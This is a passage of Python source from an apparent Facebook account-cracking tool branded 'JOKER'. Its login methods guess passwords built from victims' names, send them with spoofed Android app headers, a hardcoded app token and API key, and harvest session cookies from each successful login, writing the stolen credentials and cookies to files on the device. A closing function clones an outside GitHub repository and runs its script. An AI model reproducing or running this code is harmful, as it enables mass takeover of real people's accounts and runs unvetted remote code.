                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/212675737;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G930A;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/;FBAV/4Q095MQG;FBBV/394502190;FBAN/FBAN;FBAV/4Q095MQG;FBBV/394502190;FBDM//*{density=3.0,width=720,height=4096};FBLC/en_US;FBRV/452310244;FBCR/LG;FBMF/Apple;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5_IV;FBSV/16;FBOP/4;FBCA/armeabi;FBSS/;]','[FB4A/;FBAV/A1XDL5U4;FBBV/135791537;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/135791537;FBDM//*{density=2.0,width=1440,height=3840};FBLC/de_DE;FBRV/951597611;FBCR/Sony;FBMF/VIVO;FBBD/Honor;FBPN/com.facebook.katana;FBDV/LG_Q13;FBSV/11;FBOP/7;FBCA/armeabi;FBSS/19;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-OK\033[1;31m]\033[1;37m\> \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print("\033[1;37m </\033[1;31m[\033[1;36mCOOKIE\033[1;31m]\033[1;37m\> : \033[1;36m"+cookie)
                                        open('/sdcard/JOKER_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JOKER_M2_COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[JOKER-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
# ~/ [ Method - 3 ]
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-M3\033[1;31m]\033[1;37m\>\033[1;37m|\033[1;37m</\033[1;31m[\033[1;37m%s|\033[1;37mOK|\033[1;32m%s\033[1;31m]\033[1;37m\> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/142.0.0.29.92;FBBV/72571763;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/72870924;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J120H;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/59.0.0.0.177;FBBV/19340254;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/Claro;FBMF/LOGIC;FBBD/LOGIC;FBPN/com.facebook.katana;FBDV/LOGIC X5.5T;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':God(),
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-OK\033[1;31m]\033[1;37m\> \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print("\033[1;37m </\033[1;31m[\033[1;36mCOOKIE\033[1;31m]\033[1;37m\> : \033[1;36m"+cookie)
                                        open('/sdcard/JOKER_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JOKER_M3_COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[JOKER-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass              
                        
# ~/ [ Create Ip ]
def createip():
	os.system("cd && git clone https://github.com/mafiat2/YOUSIF16")
	os.system('cd && cd YOUSIF16 ;python IP16.py')
# ~/ [ End ]
with tred(max_workers=30) as JOKER:
 #   JOKER.submit(sexy)
    JOKER.submit(menu)
